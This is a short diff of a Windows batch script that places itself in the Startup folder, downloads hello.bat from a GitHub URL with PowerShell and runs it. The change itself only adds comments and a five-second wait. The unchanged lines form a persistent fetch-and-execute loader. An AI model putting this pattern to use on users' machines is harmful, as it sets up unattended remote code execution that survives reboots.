@@ -38,13 +38,17 @@ if not exist "%startup_file%" (
     echo The script is already in the Startup folder at %TIME%. >> "%log_file%"
 )
 
+rem Download the hello.bat file from GitHub
 powershell -Command "Invoke-WebRequest -Uri '%github_url%' -OutFile '%output_path%'"
 if %errorlevel% neq 0 (
     echo Failed to download hello.bat from GitHub at %TIME%. Exiting script. >> "%log_file%"
     exit /b 1
 )
 
+rem Execute the downloaded hello.bat and wait for 5 seconds
 start "" "%output_path%"
+timeout /t 5 >nul
+
 echo hello.bat has been executed at %TIME%. >> "%log_file%"
 
 endlocal
